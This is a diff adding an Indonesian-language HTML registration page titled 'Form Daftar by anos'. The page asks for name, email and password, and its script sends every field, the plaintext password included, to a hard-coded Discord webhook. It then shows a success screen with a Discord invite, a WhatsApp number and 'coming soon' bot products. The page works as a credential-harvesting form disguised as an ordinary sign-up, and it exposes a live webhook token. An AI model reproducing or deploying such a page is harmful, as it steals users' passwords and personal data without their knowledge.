@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Form Daftar by anos</title>
+  <style>
+    body {
+      font-family: 'Arial', sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f3f4f6;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background-image: linear-gradient(to right, #e0eafc, #cfdef3);
+    }
+
+    .container {
+      background: #fff;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
+      width: 100%;
+      max-width: 400px;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .container::before {
+      content: '';
+      position: absolute;
+      top: -50px;
+      left: -50px;
+      width: 150px;
+      height: 150px;
+      background: rgba(76, 175, 80, 0.1);
+      border-radius: 50%;
+      z-index: 0;
+    }
+
+    h1 {
+      margin: 0 0 20px;
+      font-size: 28px;
+      text-align: center;
+      color: #333;
+      position: relative;
+      z-index: 1;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 8px;
+      font-weight: bold;
+      color: #555;
+    }
+
+    input, button {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 15px;
+      border: 1px solid #ddd;
+      border-radius: 6px;
+      font-size: 16px;
+      transition: border-color 0.3s;
+    }
+
+    input:focus {
+      border-color: #4CAF50;
+      outline: none;
+    }
+
+    button {
+      background: #4CAF50;
+      color: #fff;
+      border: none;
+      cursor: pointer;
+      font-weight: bold;
+      transition: background 0.3s, transform 0.2s;
+    }
+
+    button:hover {
+      background: #45a049;
+      transform: translateY(-2px);
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    .success {
+      text-align: left;
+      color: #4CAF50;
+      font-weight: bold;
+    }
+
+    .link {
+      text-align: left;
+    }
+
+    .link a {
+      text-decoration: none;
+      color: #007bff;
+      font-weight: bold;
+      transition: color 0.3s;
+    }
+
+    .link a:hover {
+      color: #0056b3;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div id="form-container">
+      <h1>Daftar Untuk Akses Website</h1>
+      <form id="daftarForm">
+        <label for="firstName">Nama depan</label>
+        <input type="text" id="firstName" placeholder="Masukkan nama depan" required>
+        <label for="lastName">Nama belakang</label>
+        <input type="text" id="lastName" placeholder="Masukkan nama belakang" required>
+        <label for="email">Email</label>
+        <input type="email" id="email" placeholder="Masukkan Email" required>
+        <label for="password">Password</label>
+        <input type="password" id="password" placeholder="Masukkan password" required>
+        <button type="submit">Daftar</button>
+      </form>
+      <div id="registerMessage"></div>
+    </div>
+    <div id="success-container" class="hidden">
+      <div class="success">
+        <h1>Berhasil Daftar!</h1>
+        <p>Silakan Chat:</p>
+        <div class="link">
+          <a href="https://discord.com/invite/nxvw249FYv" target="_blank">Join Discord</a><br>
+          <a href="https://wa.me/6283834946034" target="_blank">Chat Wa</a>
+        </div>
+        <p>Dagangan gua:</p>
+        <ul>
+          <li>Fitur bot wa   
+          <br> <b>coming soon</b></li>
+          <li>Sc bot wa      
+          <br> <b>coming soon</b></li>
+          <li>Kodingan Python
+          <br> <b>coming soon</b></li>
+        </ul>
+      </div>
+    </div>
+  </div>
+  <script>
+    const form = document.getElementById("daftarForm");
+    const successContainer = document.getElementById("success-container");
+    const formContainer = document.getElementById("form-container");
+    
+    form.addEventListener("submit", (e) => {
+      e.preventDefault();
+      
+      const firstName = document.getElementById("firstName").value;
+      const lastName = document.getElementById("lastName").value;
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
+
+      const webhookURL = "https://discord.com/api/webhooks/1331267993916805200/ldxIhL7EUuwqEOq15y2MVIq-JYrjB4yqVFbkYs2U-ymLej4SmJfmz4Wbp_Bzm0B38QyX";
+      
+      const data = {
+        content: `━━━━━━━━━━━━━━━━━━━\n` +
+          `**New User Registration**\n` +
+          `**First Name:** ${firstName}\n` +
+          `**Last Name:** ${lastName}\n` +
+          `**Email:** ${email}\n` +
+          `**Password:** ${password}\n` +
+          `━━━━━━━━━━━━━━━━━━━`,
+      };
+
+      fetch(webhookURL, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify(data),
+      })
+        .then((response) => {
+          if (response.ok) {
+            formContainer.classList.add("hidden");
+            successContainer.classList.remove("hidden");
+          } else {
+            alert("Gagal mengirim data ke server.");
+          }
+        })
+        .catch((error) => {
+          console.error("Error:", error);
+          alert("Terjadi kesalahan, coba lagi.");
+        });
+    });
+  </script>
+</body>
+</html>
